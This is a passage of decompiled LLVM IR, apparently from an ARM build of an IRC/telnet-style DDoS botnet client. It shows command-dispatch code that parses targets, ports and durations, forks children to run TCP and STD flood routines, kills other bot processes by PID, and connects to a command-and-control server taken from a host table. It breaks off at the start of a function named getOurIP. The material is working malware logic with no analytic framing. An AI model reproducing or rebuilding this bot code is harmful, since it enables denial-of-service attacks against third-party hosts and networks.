  %v1_12604 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12608:                               ; preds = %dec_label_pc_1259c, %dec_label_pc_12528, %dec_label_pc_12454
  %v2_1260c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_21834.1245 to i32), i32* @r1, align 4
  %v3_12618 = inttoptr i32 %v2_1260c to i8*
  %v4_12618 = call i32 @__GI_strcoll(i8* %v3_12618, i32 ptrtoint ([4 x i8]* @global_var_21834.1245 to i32))
  %v2_12620 = icmp eq i32 %v4_12618, 0
  br i1 %v2_12620, label %dec_label_pc_12628, label %dec_label_pc_1276c

dec_label_pc_12628:                               ; preds = %dec_label_pc_12608
  %v7_12630 = icmp slt i32 %arg1, 4
  br i1 %v7_12630, label %dec_label_pc_12bf8, label %dec_label_pc_12634

dec_label_pc_12634:                               ; preds = %dec_label_pc_12628
  %v1_12638 = add i32 %tmp, 8
  %v1_1263c = inttoptr i32 %v1_12638 to i32*
  %v2_1263c = load i32, i32* %v1_1263c, align 4
  store i32 %v2_1263c, i32* @r0, align 4
  %v1_12644 = call i32 @atol(i32 %v2_1263c)
  %tmp136 = icmp slt i32 %v1_12644, 1
  br i1 %tmp136, label %dec_label_pc_12bf8, label %dec_label_pc_12654

dec_label_pc_12654:                               ; preds = %dec_label_pc_12634
  %v1_12658 = add i32 %tmp, 12
  %v1_1265c = inttoptr i32 %v1_12658 to i32*
  %v2_1265c = load i32, i32* %v1_1265c, align 4
  store i32 %v2_1265c, i32* @r0, align 4
  %v1_12664 = call i32 @atol(i32 %v2_1265c)
  %v5_12670 = icmp sgt i32 %v1_12664, 0
  br i1 %v5_12670, label %dec_label_pc_12678, label %dec_label_pc_12bf8

dec_label_pc_12678:                               ; preds = %dec_label_pc_12654
  %v1_1267c = add i32 %tmp, 4
  %v1_12680 = inttoptr i32 %v1_1267c to i32*
  %v2_12680 = load i32, i32* %v1_12680, align 4
  %v2_12690 = load i32, i32* %v1_1263c, align 4
  store i32 %v2_12690, i32* @r0, align 4
  %v1_12698 = call i32 @atol(i32 %v2_12690)
  %v2_126ac = load i32, i32* %v1_1265c, align 4
  store i32 %v2_126ac, i32* @r0, align 4
  %v1_126b4 = call i32 @atol(i32 %v2_126ac)
  %v2_126cc = call i32 @__GI_strchr(i32 %v2_12680, i32 44)
  %v2_126d4 = icmp eq i32 %v2_126cc, 0
  br i1 %v2_126d4, label %dec_label_pc_12744, label %dec_label_pc_126dc

dec_label_pc_126dc:                               ; preds = %dec_label_pc_12678
  store i32 %v2_12680, i32* @r0, align 4
  %v3_126e8 = call i32 @__GI_strtok(i32 %v2_12680, i32* nonnull @global_var_21744.1185)
  %v2_1273840 = icmp eq i32 %v3_126e8, 0
  br i1 %v2_1273840, label %dec_label_pc_1276c, label %dec_label_pc_126f8

dec_label_pc_126f8:                               ; preds = %dec_label_pc_126dc, %dec_label_pc_12720
  %storemerge1641 = phi i32 [ %v3_12728, %dec_label_pc_12720 ], [ %v3_126e8, %dec_label_pc_126dc ]
  %v0_126f8 = call i32 @listFork()
  %v2_12700 = icmp eq i32 %v0_126f8, 0
  br i1 %v2_12700, label %dec_label_pc_12708, label %dec_label_pc_12720

dec_label_pc_12708:                               ; preds = %dec_label_pc_126f8
  %v3_12714 = call i32 @sendSTD(i32 %storemerge1641, i32 %v1_12698, i32 %v1_126b4)
  %v1_1271c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12720:                               ; preds = %dec_label_pc_126f8
  store i32 0, i32* @r0, align 4
  %v3_12728 = call i32 @__GI_strtok(i32 0, i32* nonnull @global_var_21744.1185)
  %v2_12738 = icmp eq i32 %v3_12728, 0
  br i1 %v2_12738, label %dec_label_pc_1276c, label %dec_label_pc_126f8

dec_label_pc_12744:                               ; preds = %dec_label_pc_12678
  %v0_12744 = call i32 @listFork()
  %v2_1274c = icmp eq i32 %v0_12744, 0
  br i1 %v2_1274c, label %dec_label_pc_12754, label %dec_label_pc_12bf8

dec_label_pc_12754:                               ; preds = %dec_label_pc_12744
  %v3_12760 = call i32 @sendSTD(i32 %v2_12680, i32 %v1_12698, i32 %v1_126b4)
  %v1_12768 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_1276c:                               ; preds = %dec_label_pc_12720, %dec_label_pc_126dc, %dec_label_pc_12608
  %v2_12770 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_21838.1247 to i32), i32* @r1, align 4
  %v3_1277c = inttoptr i32 %v2_12770 to i8*
  %v4_1277c = call i32 @__GI_strcoll(i8* %v3_1277c, i32 ptrtoint ([4 x i8]* @global_var_21838.1247 to i32))
  %v2_12784 = icmp eq i32 %v4_1277c, 0
  br i1 %v2_12784, label %dec_label_pc_1278c, label %dec_label_pc_12ab8

dec_label_pc_1278c:                               ; preds = %dec_label_pc_1276c
  %v7_12794 = icmp slt i32 %arg1, 6
  br i1 %v7_12794, label %dec_label_pc_12bf8, label %dec_label_pc_12798

dec_label_pc_12798:                               ; preds = %dec_label_pc_1278c
  %v1_1279c = add i32 %tmp, 12
  %v1_127a0 = inttoptr i32 %v1_1279c to i32*
  %v2_127a0 = load i32, i32* %v1_127a0, align 4
  store i32 %v2_127a0, i32* @r0, align 4
  %v1_127a8 = call i32 @atol(i32 %v2_127a0)
  %v7_127b0 = icmp eq i32 %v1_127a8, -1
  br i1 %v7_127b0, label %dec_label_pc_12bf8, label %dec_label_pc_127b8

dec_label_pc_127b8:                               ; preds = %dec_label_pc_12798
  %v1_127bc = add i32 %tmp, 8
  %v1_127c0 = inttoptr i32 %v1_127bc to i32*
  %v2_127c0 = load i32, i32* %v1_127c0, align 4
  store i32 %v2_127c0, i32* @r0, align 4
  %v1_127c8 = call i32 @atol(i32 %v2_127c0)
  %v7_127d0 = icmp eq i32 %v1_127c8, -1
  br i1 %v7_127d0, label %dec_label_pc_12bf8, label %dec_label_pc_127d8

dec_label_pc_127d8:                               ; preds = %dec_label_pc_127b8
  %v1_127dc = add i32 %tmp, 16
  %v1_127e0 = inttoptr i32 %v1_127dc to i32*
  %v2_127e0 = load i32, i32* %v1_127e0, align 4
  store i32 %v2_127e0, i32* @r0, align 4
  %v1_127e8 = call i32 @atol(i32 %v2_127e0)
  %v7_127f0 = icmp eq i32 %v1_127e8, -1
  br i1 %v7_127f0, label %dec_label_pc_12bf8, label %dec_label_pc_127f8

dec_label_pc_127f8:                               ; preds = %dec_label_pc_127d8
  %v2_12800 = load i32, i32* %v1_127e0, align 4
  store i32 %v2_12800, i32* @r0, align 4
  %v1_12808 = call i32 @atol(i32 %v2_12800)
  %v8_12814 = icmp sgt i32 %v1_12808, 32
  br i1 %v8_12814, label %dec_label_pc_12bf8, label %dec_label_pc_12818

dec_label_pc_12818:                               ; preds = %dec_label_pc_127f8
  %v7_12820 = icmp slt i32 %arg1, 7
  br i1 %v7_12820, label %dec_label_pc_12844, label %dec_label_pc_12824

dec_label_pc_12824:                               ; preds = %dec_label_pc_12818
  %v1_12828 = add i32 %tmp, 24
  %v1_1282c = inttoptr i32 %v1_12828 to i32*
  %v2_1282c = load i32, i32* %v1_1282c, align 4
  store i32 %v2_1282c, i32* @r0, align 4
  %v1_12834 = call i32 @atol(i32 %v2_1282c)
  %v1_1283c = icmp slt i32 %v1_12834, 0
  br i1 %v1_1283c, label %dec_label_pc_12bf8, label %dec_label_pc_12844

dec_label_pc_12844:                               ; preds = %dec_label_pc_12824, %dec_label_pc_12818
  %v7_12848 = icmp eq i32 %arg1, 8
  br i1 %v7_12848, label %dec_label_pc_12850, label %dec_label_pc_128f0

dec_label_pc_12850:                               ; preds = %dec_label_pc_12844
  %v1_12854 = add i32 %tmp, 28
  %v1_12858 = inttoptr i32 %v1_12854 to i32*
  %v2_12858 = load i32, i32* %v1_12858, align 4
  store i32 %v2_12858, i32* @r0, align 4
  %v1_12860 = call i32 @atol(i32 %v2_12858)
  %v5_1286c = icmp sgt i32 %v1_12860, 0
  br i1 %v5_1286c, label %dec_label_pc_128f0, label %dec_label_pc_12bf8

dec_label_pc_128f0:                               ; preds = %dec_label_pc_12844, %dec_label_pc_12850
  %v1_128f4 = add i32 %tmp, 4
  %v1_128f8 = inttoptr i32 %v1_128f4 to i32*
  %v2_128f8 = load i32, i32* %v1_128f8, align 4
  %v2_12908 = load i32, i32* %v1_127c0, align 4
  store i32 %v2_12908, i32* @r0, align 4
  %v1_12910 = call i32 @atol(i32 %v2_12908)
  %v2_12924 = load i32, i32* %v1_127a0, align 4
  store i32 %v2_12924, i32* @r0, align 4
  %v1_1292c = call i32 @atol(i32 %v2_12924)
  %v2_12940 = load i32, i32* %v1_127e0, align 4
  store i32 %v2_12940, i32* @r0, align 4
  %v1_12948 = call i32 @atol(i32 %v2_12940)
  %v1_12958 = add i32 %tmp, 20
  %v1_1295c = inttoptr i32 %v1_12958 to i32*
  %v2_1295c = load i32, i32* %v1_1295c, align 4
  br i1 %v7_12848, label %dec_label_pc_12970, label %dec_label_pc_1298c

dec_label_pc_12970:                               ; preds = %dec_label_pc_128f0
  %v1_12974 = add i32 %tmp, 28
  %v1_12978 = inttoptr i32 %v1_12974 to i32*
  %v2_12978 = load i32, i32* %v1_12978, align 4
  store i32 %v2_12978, i32* @r0, align 4
  %v1_12980 = call i32 @atol(i32 %v2_12978)
  br label %dec_label_pc_12994

dec_label_pc_1298c:                               ; preds = %dec_label_pc_128f0
  br label %dec_label_pc_12994

dec_label_pc_12994:                               ; preds = %dec_label_pc_12970, %dec_label_pc_1298c
  %storemerge3 = phi i32 [ 10, %dec_label_pc_1298c ], [ %v1_12980, %dec_label_pc_12970 ]
  br i1 %v7_12820, label %dec_label_pc_129c4, label %dec_label_pc_129a8

dec_label_pc_129a8:                               ; preds = %dec_label_pc_12994
  %v1_129ac = add i32 %tmp, 24
  %v1_129b0 = inttoptr i32 %v1_129ac to i32*
  %v2_129b0 = load i32, i32* %v1_129b0, align 4
  store i32 %v2_129b0, i32* @r0, align 4
  %v1_129b8 = call i32 @atol(i32 %v2_129b0)
  br label %dec_label_pc_129cc

dec_label_pc_129c4:                               ; preds = %dec_label_pc_12994
  br label %dec_label_pc_129cc

dec_label_pc_129cc:                               ; preds = %dec_label_pc_129a8, %dec_label_pc_129c4
  %storemerge2 = phi i32 [ 0, %dec_label_pc_129c4 ], [ %v1_129b8, %dec_label_pc_129a8 ]
  %v2_129e0 = call i32 @__GI_strchr(i32 %v2_128f8, i32 44)
  %v2_129e8 = icmp eq i32 %v2_129e0, 0
  br i1 %v2_129e8, label %dec_label_pc_12a74, label %dec_label_pc_129f0

dec_label_pc_129f0:                               ; preds = %dec_label_pc_129cc
  store i32 %v2_128f8, i32* @r0, align 4
  %v3_129fc = call i32 @__GI_strtok(i32 %v2_128f8, i32* nonnull @global_var_21744.1185)
  %v2_12a6837 = icmp eq i32 %v3_129fc, 0
  br i1 %v2_12a6837, label %dec_label_pc_12ab8, label %dec_label_pc_12a0c

dec_label_pc_12a0c:                               ; preds = %dec_label_pc_129f0, %dec_label_pc_12a50
  %storemerge1438 = phi i32 [ %v3_12a58, %dec_label_pc_12a50 ], [ %v3_129fc, %dec_label_pc_129f0 ]
  %v0_12a0c = call i32 @listFork()
  %v2_12a14 = icmp eq i32 %v0_12a0c, 0
  br i1 %v2_12a14, label %dec_label_pc_12a1c, label %dec_label_pc_12a50

dec_label_pc_12a1c:                               ; preds = %dec_label_pc_12a0c
  %v7_12a44 = call i32 @sendTCP(i32 %storemerge1438, i32 %v1_12910, i32 %v1_1292c, i32 %v1_12948, i32 %v2_1295c, i32 %storemerge2, i32 %storemerge3)
  %v1_12a4c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a0c
  store i32 0, i32* @r0, align 4
  %v3_12a58 = call i32 @__GI_strtok(i32 0, i32* nonnull @global_var_21744.1185)
  %v2_12a68 = icmp eq i32 %v3_12a58, 0
  br i1 %v2_12a68, label %dec_label_pc_12ab8, label %dec_label_pc_12a0c

dec_label_pc_12a74:                               ; preds = %dec_label_pc_129cc
  %v0_12a74 = call i32 @listFork()
  %v2_12a7c = icmp eq i32 %v0_12a74, 0
  br i1 %v2_12a7c, label %dec_label_pc_12a84, label %dec_label_pc_12bf8

dec_label_pc_12a84:                               ; preds = %dec_label_pc_12a74
  %v7_12aac = call i32 @sendTCP(i32 %v2_128f8, i32 %v1_12910, i32 %v1_1292c, i32 %v1_12948, i32 %v2_1295c, i32 %storemerge2, i32 %storemerge3)
  %v1_12ab4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12ab8:                               ; preds = %dec_label_pc_12a50, %dec_label_pc_129f0, %dec_label_pc_1276c
  %v2_12abc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_2183c.1249 to i32), i32* @r1, align 4
  %v3_12ac8 = inttoptr i32 %v2_12abc to i8*
  %v4_12ac8 = call i32 @__GI_strcoll(i8* %v3_12ac8, i32 ptrtoint ([5 x i8]* @global_var_2183c.1249 to i32))
  %v2_12ad0 = icmp eq i32 %v4_12ac8, 0
  br i1 %v2_12ad0, label %dec_label_pc_12ad8, label %dec_label_pc_12bd0

dec_label_pc_12ad8:                               ; preds = %dec_label_pc_12ab8
  br label %dec_label_pc_12b7c

dec_label_pc_12aec:                               ; preds = %dec_label_pc_12b7c, %dec_label_pc_12bb0
  %v3_12af0 = mul i32 %storemerge12, 4
  %v2_12afc = load i32, i32* @global_var_31854.64, align 4
  %v2_12b00 = add i32 %v2_12afc, %v3_12af0
  %v1_12b04 = inttoptr i32 %v2_12b00 to i32*
  %v2_12b04 = load i32, i32* %v1_12b04, align 4
  %v2_12b08 = icmp eq i32 %v2_12b04, 0
  br i1 %v2_12b08, label %dec_label_pc_12b70, label %dec_label_pc_12b10

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12aec
  %v2_12b28 = load i32, i32* %v1_12b04, align 4
  store i32 %v2_12b28, i32* @r4, align 4
  %v0_12b2c = call i32 @__libc_getpid()
  %v0_12b34 = load i32, i32* @r4, align 4
  %v9_12b34 = icmp eq i32 %v0_12b34, %v0_12b2c
  br i1 %v9_12b34, label %dec_label_pc_12b70, label %dec_label_pc_12b3c

dec_label_pc_12b3c:                               ; preds = %dec_label_pc_12b10
  %v0_12b60 = call i32 @kill()
  %v1_12b68 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_12b70

dec_label_pc_12b70:                               ; preds = %dec_label_pc_12b10, %dec_label_pc_12aec, %dec_label_pc_12b3c
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_12aec ], [ %stack_var_-44.1, %dec_label_pc_12b10 ], [ %v1_12b68, %dec_label_pc_12b3c ]
  %v1_12b74 = add i32 %storemerge12, 1
  br label %dec_label_pc_12b7c

dec_label_pc_12b7c:                               ; preds = %dec_label_pc_12ad8, %dec_label_pc_12b70
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_12ad8 ], [ %stack_var_-44.0, %dec_label_pc_12b70 ]
  %storemerge12 = phi i32 [ 0, %dec_label_pc_12ad8 ], [ %v1_12b74, %dec_label_pc_12b70 ]
  %v5_12b94 = load i32, i32* @global_var_2b5d8.62, align 4
  %v9_12ba8 = icmp eq i32 %v5_12b94, 0
  br i1 %v9_12ba8, label %dec_label_pc_12bb0, label %dec_label_pc_12aec

dec_label_pc_12bb0:                               ; preds = %dec_label_pc_12b7c
  %v2_12b94 = load i32, i32* @global_var_2b5d4.61, align 4
  %tmp151 = icmp ugt i32 %v2_12b94, %storemerge12
  br i1 %tmp151, label %dec_label_pc_12aec, label %dec_label_pc_12bd0

dec_label_pc_12bd0:                               ; preds = %dec_label_pc_12bb0, %dec_label_pc_12ab8
  %v2_12bd4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_21844.1253 to i32), i32* @r1, align 4
  %v3_12be0 = inttoptr i32 %v2_12bd4 to i8*
  %v4_12be0 = call i32 @__GI_strcoll(i8* %v3_12be0, i32 ptrtoint ([12 x i8]* @global_var_21844.1253 to i32))
  %v2_12be8 = icmp eq i32 %v4_12be0, 0
  br i1 %v2_12be8, label %dec_label_pc_12bf0, label %dec_label_pc_12bf8

dec_label_pc_12bf0:                               ; preds = %dec_label_pc_12bd0
  %v1_12bf4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_12bf8

dec_label_pc_12bf8:                               ; preds = %dec_label_pc_12850, %dec_label_pc_12654, %dec_label_pc_124a0, %dec_label_pc_1232c, %dec_label_pc_11f28, %dec_label_pc_11d00, %dec_label_pc_11b9c, %dec_label_pc_11c8c, %dec_label_pc_11e00, %dec_label_pc_1209c, %dec_label_pc_12228, %dec_label_pc_1242c, %dec_label_pc_125c0, %dec_label_pc_12744, %dec_label_pc_12a74, %dec_label_pc_12bd0, %dec_label_pc_11b00, %dec_label_pc_11a90, %dec_label_pc_120f8, %dec_label_pc_11efc, %dec_label_pc_11ed4, %dec_label_pc_11eb4, %dec_label_pc_11e94, %dec_label_pc_11e74, %dec_label_pc_11e54, %dec_label_pc_11e48, %dec_label_pc_11ce0, %dec_label_pc_11cd4, %dec_label_pc_11b7c, %dec_label_pc_11b70, %dec_label_pc_11a28, %dec_label_pc_12824, %dec_label_pc_127f8, %dec_label_pc_127d8, %dec_label_pc_127b8, %dec_label_pc_12798, %dec_label_pc_1278c, %dec_label_pc_12634, %dec_label_pc_12628, %dec_label_pc_12480, %dec_label_pc_12474, %dec_label_pc_1230c, %dec_label_pc_12300, %dec_label_pc_11ab8, %dec_label_pc_119ec, %dec_label_pc_118f0, %dec_label_pc_118b8, %dec_label_pc_12bf0
  %v24_12bfc = phi i32 [ %v1_12860, %dec_label_pc_12850 ], [ %v1_12664, %dec_label_pc_12654 ], [ %v1_124b0, %dec_label_pc_124a0 ], [ %v1_1233c, %dec_label_pc_1232c ], [ %v1_11f38, %dec_label_pc_11f28 ], [ %v1_11d10, %dec_label_pc_11d00 ], [ %v1_11bac, %dec_label_pc_11b9c ], [ %v0_11c8c, %dec_label_pc_11c8c ], [ %v0_11e00, %dec_label_pc_11e00 ], [ %v0_1209c, %dec_label_pc_1209c ], [ %v0_12228, %dec_label_pc_12228 ], [ %v0_1242c, %dec_label_pc_1242c ], [ %v0_125c0, %dec_label_pc_125c0 ], [ %v0_12744, %dec_label_pc_12744 ], [ %v0_12a74, %dec_label_pc_12a74 ], [ %v4_12be0, %dec_label_pc_12bd0 ], [ 0, %dec_label_pc_11b00 ], [ 0, %dec_label_pc_11a90 ], [ 0, %dec_label_pc_120f8 ], [ %v1_11f0c, %dec_label_pc_11efc ], [ %v1_11ee4, %dec_label_pc_11ed4 ], [ %v1_11ec4, %dec_label_pc_11eb4 ], [ %v1_11ea4, %dec_label_pc_11e94 ], [ %v1_11e84, %dec_label_pc_11e74 ], [ %v1_11e64, %dec_label_pc_11e54 ], [ 0, %dec_label_pc_11e48 ], [ %v1_11cf0, %dec_label_pc_11ce0 ], [ 0, %dec_label_pc_11cd4 ], [ %v1_11b8c, %dec_label_pc_11b7c ], [ 0, %dec_label_pc_11b70 ], [ 0, %dec_label_pc_11a28 ], [ %v1_12834, %dec_label_pc_12824 ], [ %v1_12808, %dec_label_pc_127f8 ], [ %v1_127e8, %dec_label_pc_127d8 ], [ %v1_127c8, %dec_label_pc_127b8 ], [ %v1_127a8, %dec_label_pc_12798 ], [ 0, %dec_label_pc_1278c ], [ %v1_12644, %dec_label_pc_12634 ], [ 0, %dec_label_pc_12628 ], [ %v1_12490, %dec_label_pc_12480 ], [ 0, %dec_label_pc_12474 ], [ %v1_1231c, %dec_label_pc_1230c ], [ 0, %dec_label_pc_12300 ], [ %v0_11aa0, %dec_label_pc_11ab8 ], [ %v3_119fc, %dec_label_pc_119ec ], [ %v3_11914, %dec_label_pc_118f0 ], [ %v3_118c8, %dec_label_pc_118b8 ], [ %v1_12bf4, %dec_label_pc_12bf0 ]
  store i32 %v3_11884, i32* @r4, align 4
  store i32 %v6_11884, i32* @r5, align 4
  store i32 %v9_11884, i32* @r6, align 4
  store i32 %v12_11884, i32* @r7, align 4
  store i32 %v15_11884, i32* @r8, align 4
  store i32 %v18_11884, i32* @fp, align 4
  ret i32 %v24_12bfc

; uselistorder directives
  uselistorder i32 %stack_var_-44.1, { 0, 2, 1 }
  uselistorder i32 %v3_12a58, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v1_12948, { 1, 0 }
  uselistorder i32 %v1_1292c, { 1, 0 }
  uselistorder i32 %v1_12910, { 1, 0 }
  uselistorder i32 %v2_128f8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_127e8, { 1, 0 }
  uselistorder i32 %v1_127c8, { 1, 0 }
  uselistorder i32 %v1_127a8, { 1, 0 }
  uselistorder i32 %v3_12728, { 1, 0 }
  uselistorder i32 %v1_126b4, { 1, 0 }
  uselistorder i32 %v1_12698, { 1, 0 }
  uselistorder i32 %v2_12680, { 2, 1, 0, 3 }
  uselistorder i32 %v3_125a4, { 1, 0 }
  uselistorder i32 %v1_12500, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v1_124e4, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_124cc, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32 %v3_12410, { 1, 0 }
  uselistorder i32 %v1_1238c, { 1, 0 }
  uselistorder i32 %v1_12370, { 1, 0 }
  uselistorder i32 %v2_12358, { 2, 1, 0, 3 }
  uselistorder i32* %v1_1210c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_12080, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %v1_11fa4, { 1, 0 }
  uselistorder i32 %v1_11f88, { 1, 0 }
  uselistorder i32 %v1_11f6c, { 1, 0 }
  uselistorder i32 %v2_11f54, { 2, 1, 0, 3 }
  uselistorder i32 %v1_11ec4, { 1, 0 }
  uselistorder i32 %v1_11ea4, { 1, 0 }
  uselistorder i32 %v1_11e84, { 1, 0 }
  uselistorder i32 %v1_11e64, { 1, 0 }
  uselistorder i32 %v3_11de4, { 1, 0 }
  uselistorder i32 %v1_11d60, { 1, 0 }
  uselistorder i32 %v1_11d44, { 1, 0 }
  uselistorder i32 %v2_11d2c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_11c70, { 1, 0 }
  uselistorder i32 %v1_11bfc, { 1, 0 }
  uselistorder i32 %v1_11be0, { 1, 0 }
  uselistorder i32 %v2_11bc8, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 6, 7, 8, 9, 10, 5, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 1, 2, 3, 4, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendJUNK, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 1, 0, 3, 2 }
  uselistorder i32* @global_var_21744.1185, { 7, 8, 6, 9, 5, 10, 4, 11, 3, 12, 2, 13, 1, 14, 0, 15, 16, 17 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_217e4.1226 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_31850.1222, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1d238.57 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_12bf8, { 47, 15, 14, 0, 31, 32, 33, 34, 35, 36, 13, 1, 37, 38, 12, 2, 39, 40, 11, 3, 41, 42, 10, 18, 9, 4, 19, 20, 21, 22, 23, 24, 25, 8, 5, 26, 27, 7, 6, 28, 29, 16, 43, 17, 30, 44, 45, 46 }
  uselistorder label %dec_label_pc_12b7c, { 1, 0 }
  uselistorder label %dec_label_pc_12b70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12aec, { 1, 0 }
  uselistorder label %dec_label_pc_12a0c, { 1, 0 }
  uselistorder label %dec_label_pc_129cc, { 1, 0 }
  uselistorder label %dec_label_pc_12994, { 1, 0 }
  uselistorder label %dec_label_pc_128f0, { 1, 0 }
  uselistorder label %dec_label_pc_126f8, { 1, 0 }
  uselistorder label %dec_label_pc_12544, { 1, 0 }
  uselistorder label %dec_label_pc_123d0, { 1, 0 }
  uselistorder label %dec_label_pc_1214c, { 1, 0 }
  uselistorder label %dec_label_pc_1203c, { 1, 0 }
  uselistorder label %dec_label_pc_11ffc, { 1, 0 }
  uselistorder label %dec_label_pc_11f4c, { 1, 0 }
  uselistorder label %dec_label_pc_11da4, { 1, 0 }
  uselistorder label %dec_label_pc_11c40, { 1, 0 }
  uselistorder label %dec_label_pc_11a6c, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_12c04 = load i32, i32* @fp, align 4
  store i32 76812, i32* %stack_var_-4, align 4
  %v2_12c08 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12c08, i32* @fp, align 4
  %v2_12c1c = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_12c2c = bitcast i32* %stack_var_-4116 to i8*
  %v3_12c2c = call i32 @__GI_memset(i8* %v2_12c2c, i32 0)
  %v2_12c34 = load i32, i32* @global_var_2b5d0.55, align 4
  %v2_12c38 = icmp eq i32 %v2_12c34, 0
  br i1 %v2_12c38, label %dec_label_pc_12c5c, label %dec_label_pc_12c40

dec_label_pc_12c40:                               ; preds = %entry
  %v1_12c4c = call i32 @__libc_close(i32 %v2_12c34)
  store i32 0, i32* @global_var_2b5d0.55, align 4
  br label %dec_label_pc_12c5c

dec_label_pc_12c5c:                               ; preds = %entry, %dec_label_pc_12c40
  %v2_12c60 = load i32, i32* @global_var_2b1cc.1256, align 4
  %v2_12c64 = icmp eq i32 %v2_12c60, 0
  br i1 %v2_12c64, label %dec_label_pc_12c90, label %dec_label_pc_12c7c

dec_label_pc_12c7c:                               ; preds = %dec_label_pc_12c5c
  %v1_12c84 = add i32 %v2_12c60, 1
  br label %dec_label_pc_12c90

dec_label_pc_12c90:                               ; preds = %dec_label_pc_12c5c, %dec_label_pc_12c7c
  %storemerge1 = phi i32 [ %v1_12c84, %dec_label_pc_12c7c ], [ 0, %dec_label_pc_12c5c ]
  store i32 %storemerge1, i32* @global_var_2b1cc.1256, align 4
  %v4_12ca8 = mul i32 %storemerge1, 4
  %v5_12ca8 = add i32 %v4_12ca8, ptrtoint ([15 x i8]** @global_var_2b098.1259 to i32)
  %v6_12ca8 = inttoptr i32 %v5_12ca8 to i32*
  %v7_12ca8 = load i32, i32* %v6_12ca8, align 4
  %v2_12cb4 = inttoptr i32 %v7_12ca8 to i8*
  %v3_12cb4 = call i32 @strcpy(i32 %v2_12c1c, i8* %v2_12cb4)
  %v2_12cbc = load i32, i32* @global_var_2b09c.1261, align 4
  %v2_12cd8 = call i32 @__GI_strchr(i32 %v2_12c1c, i32 58)
  %v2_12ce0 = icmp eq i32 %v2_12cd8, 0
  br i1 %v2_12ce0, label %dec_label_pc_12d40, label %dec_label_pc_12ce8

dec_label_pc_12ce8:                               ; preds = %dec_label_pc_12c90
  %v2_12cfc = call i32 @__GI_strchr(i32 %v2_12c1c, i32 58)
  %v1_12d04 = add i32 %v2_12cfc, 1
  store i32 %v1_12d04, i32* @r0, align 4
  %v1_12d0c = call i32 @atol(i32 %v1_12d04)
  %v2_12d2c = call i32 @__GI_strchr(i32 %v2_12c1c, i32 58)
  %v3_12d3c = inttoptr i32 %v2_12d2c to i8*
  store i8 0, i8* %v3_12d3c, align 1
  br label %dec_label_pc_12d40

dec_label_pc_12d40:                               ; preds = %dec_label_pc_12c90, %dec_label_pc_12ce8
  %stack_var_-20.0 = phi i32 [ %v2_12cbc, %dec_label_pc_12c90 ], [ %v1_12d0c, %dec_label_pc_12ce8 ]
  %v0_12d4c = call i32 @socket()
  store i32 %v0_12d4c, i32* @global_var_2b5d0.55, align 4
  %v4_12d80 = call i32 @connectTimeout(i32 %v0_12d4c, i32 %v2_12c1c, i32 %stack_var_-20.0, i32 30)
  %v2_12d88 = icmp eq i32 %v4_12d80, 0
  %. = zext i1 %v2_12d88 to i32
  store i32 %v3_12c04, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_12c1c, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 30, { 0, 1, 4, 2, 3 }
  uselistorder i32 (i32)* @atol, { 49, 48, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28 }
  uselistorder label %dec_label_pc_12d40, { 1, 0 }
  uselistorder label %dec_label_pc_12c90, { 1, 0 }
  uselistorder label %dec_label_pc_12c5c, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
